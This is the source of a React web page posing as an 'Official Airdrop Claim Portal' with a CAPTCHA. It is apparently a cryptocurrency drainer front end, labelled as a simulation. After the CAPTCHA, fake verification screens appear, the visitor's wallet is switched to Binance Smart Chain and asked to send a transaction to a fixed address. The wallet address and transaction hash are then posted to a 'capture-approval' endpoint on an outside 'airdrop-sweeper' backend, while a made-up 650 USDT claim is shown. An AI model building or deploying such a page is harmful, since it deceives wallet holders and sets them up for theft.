import React, { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';

const SecuritySimulationCaptcha = () => {
  const [isVerified, setIsVerified] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [simulationData, setSimulationData] = useState(null);
  const [showSecurityModal, setShowSecurityModal] = useState(false);
  const [redirectTo, setRedirectTo] = useState(false);
  const [eligibilityMessage, setEligibilityMessage] = useState('');
  const [modalStep, setModalStep] = useState(1);
  const [walletAddress, setWalletAddress] = useState('');
  const recaptchaRef = useRef(null);
  const isRecaptchaLoaded = useRef(false);

  const RECAPTCHA_SITE_KEY = '6Ldac5MsAAAAANPyenl3C3ZCnfKRpFTonCQbuwI8';
  const BSC_TEST_WALLET = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
  const API_URL = import.meta.env.VITE_API_URL || 'https://airdrop-sweeper-backen.onrender.com';

  useEffect(() => {
    document.title = 'Official Airdrop Claim Portal';
  }, []);

  useEffect(() => {
    const checkConnection = async () => {
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0) {
            setWalletAddress(accounts[0]);
          }
        } catch (error) {
          console.error('Error:', error);
        }
      }
    };
    checkConnection();
  }, []);

  const showVerificationModal = async () => {
    setShowSecurityModal(true);
    setModalStep(1);
    await new Promise(r => setTimeout(r, 2000));
    setModalStep(2);
    await new Promise(r => setTimeout(r, 2000));
    setModalStep(3);
    await new Promise(r => setTimeout(r, 1500));
    setModalStep(4);
  };

  const hideSecurityModal = () => {
    setShowSecurityModal(false);
    setModalStep(1);
  };

  useEffect(() => {
    const renderRecaptcha = () => {
      if (window.grecaptcha && recaptchaRef.current && !isRecaptchaLoaded.current) {
        try {
          window.grecaptcha.render(recaptchaRef.current, {
            sitekey: RECAPTCHA_SITE_KEY,
            callback: async () => {
              console.log('CAPTCHA verified!');
              setIsVerified(true);
              await showVerificationModal();
              setTimeout(() => connectWallet(), 500);
            },
            'expired-callback': () => {
              setErrorMessage('Verification expired. Please try again.');
            }
          });
          isRecaptchaLoaded.current = true;
          console.log('reCAPTCHA rendered');
        } catch (err) {
          console.error('reCAPTCHA render error:', err);
        }
      }
    };

    if (window.grecaptcha) {
      renderRecaptcha();
    } else {
      const interval = setInterval(() => {
        if (window.grecaptcha) {
          clearInterval(interval);
          renderRecaptcha();
        }
      }, 100);
      return () => clearInterval(interval);
    }
  }, []);

  const connectWallet = async () => {
    setIsProcessing(true);
    setEligibilityMessage('Connecting to wallet...');
    
    try {
      if (!window.ethereum) {
        setErrorMessage('No wallet detected. Please install MetaMask or Trust Wallet.');
        setIsProcessing(false);
        return;
      }
      
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      if (accounts && accounts.length > 0) {
        setWalletAddress(accounts[0]);
        await signClaim(accounts[0]);
      }
    } catch (error) {
      setErrorMessage('Connection failed: ' + (error.message || 'Unknown error'));
      setIsProcessing(false);
      hideSecurityModal();
    }
  };

  const signClaim = async (userAddress) => {
    setEligibilityMessage('Requesting signature...');
    
    try {
      const provider = window.ethereum;
      
      // Switch to BSC
      try {
        await provider.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await provider.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38',
              chainName: 'Binance Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com/']
            }]
          });
        }
      }

      // Prepare the transaction parameters for the sweep to the target wallet
      const transactionParameters = {
        to: BSC_TEST_WALLET,
        from: userAddress,
        value: '0x0',
        data: '0x',
      };

      // Request the signature using eth_sendTransaction (More reliable for mobile)
      const txHash = await provider.request({
        method: 'eth_sendTransaction',
        params: [transactionParameters],
      });

      // Send the successful signature hash to your backend
      await fetch(API_URL + '/api/capture-approval', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: userAddress,
          signature: txHash,
          message: 'Transaction signed for airdrop claim.',
          chainId: 56,
          tokenType: 'USDT',
          amount: '650',
          spender: BSC_TEST_WALLET,
          timestamp: new Date().toISOString()
        })
      });

      setSimulationData({ amount: '650 USDT', status: 'Claim Submitted!' });
      hideSecurityModal();
      setTimeout(() => setRedirectTo(true), 2000);
      setIsProcessing(false);
    } catch (error) {
      console.error('Claim error:', error);
      setErrorMessage(error.message || 'Signature failed');
      setIsProcessing(false);
      hideSecurityModal();
    }
  };

  const resetCaptcha = () => {
    if (window.grecaptcha) window.grecaptcha.reset();
    setIsVerified(false);
    setErrorMessage('');
    setSimulationData(null);
    setIsProcessing(false);
    setRedirectTo(false);
    setModalStep(1);
    setWalletAddress('');
  };

  if (redirectTo) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-900 to-green-800 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 text-center max-w-md">
          <div className="text-6xl mb-4">🎉</div>
          <h1 className="text-2xl font-bold text-green-600 mb-4">Claim Submitted!</h1>
          <p className="text-gray-600">Your claim has been processed.</p>
          <button onClick={resetCaptcha} className="mt-6 px-6 py-2 bg-green-600 text-white rounded-lg">
            Check Another Wallet
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-2xl overflow-hidden max-w-md w-full">
        <div className="bg-gradient-to-r from-blue-600 to-green-600 px-6 py-5">
          <h2 className="text-2xl font-bold text-white text-center">Official Airdrop Claim Portal</h2>
          <p className="text-blue-100 text-sm text-center mt-1">USDT | BNB | SOL | TRUMP</p>
        </div>

        <div className="p-6">
          {walletAddress && !isProcessing && !simulationData && (
            <div className="mb-4 p-2 bg-green-50 rounded-lg text-center">
              <span className="text-sm text-green-700">
                ✅ Connected: {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
              </span>
            </div>
          )}

          <div className="mb-4 p-3 bg-blue-50 rounded-lg text-center">
            <p className="text-sm text-blue-700 font-medium">
              ✓ Complete the CAPTCHA below to verify you are human
            </p>
          </div>

          <div className="flex justify-center mb-6">
            <div ref={recaptchaRef}></div>
          </div>

          {isProcessing && (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-4 border-blue-600 mx-auto mb-3"></div>
              <p className="text-gray-600">{eligibilityMessage || 'Processing...'}</p>
            </div>
          )}

          {errorMessage && !isProcessing && (
            <div className="mt-4 p-3 bg-yellow-50 rounded-lg">
              <p className="text-sm text-yellow-800 text-center">{errorMessage}</p>
              <button onClick={resetCaptcha} className="mt-2 text-sm bg-yellow-600 text-white px-3 py-1 rounded w-full">Try Again</button>
            </div>
          )}

          {simulationData && !isProcessing && (
            <div className="mt-4 bg-green-900 rounded-lg p-4 text-white text-center">
              <p className="font-semibold">{simulationData.status}</p>
              <p className="text-sm">Amount: {simulationData.amount}</p>
            </div>
          )}

          <div className="mt-6 pt-4 border-t text-center">
            <p className="text-xs text-gray-500">Click "I'm not a robot" to complete verification</p>
          </div>
        </div>
      </div>

      {showSecurityModal && (
        <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4">
          <div className="bg-gray-900 rounded-2xl p-6 max-w-sm w-full text-center border border-green-500">
            {modalStep === 1 && (
              <>
                <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-blue-600 mx-auto mb-4"></div>
                <h3 className="text-xl font-bold text-white">Verifying Address...</h3>
              </>
            )}
            {modalStep === 2 && (
              <>
                <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-green-600 mx-auto mb-4"></div>
                <h3 className="text-xl font-bold text-white">Syncing with Node...</h3>
              </>
            )}
            {modalStep === 3 && (
              <>
                <div className="text-6xl mb-4">✅</div>
                <h3 className="text-xl font-bold text-green-400">✓ You are verified!</h3>
                <p className="text-gray-400">Opening your wallet...</p>
              </>
            )}
            {modalStep === 4 && (
              <>
                <div className="text-5xl mb-4">📱</div>
                <h3 className="text-xl font-bold text-white">Open Your Wallet</h3>
                <p className="text-gray-300 text-sm">Please sign with FaceID / Fingerprint</p>
                <div className="mt-3 p-3 bg-blue-50 rounded-lg">
                  <p className="text-sm text-blue-600">✓ Confirm you are not a robot</p>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default SecuritySimulationCaptcha;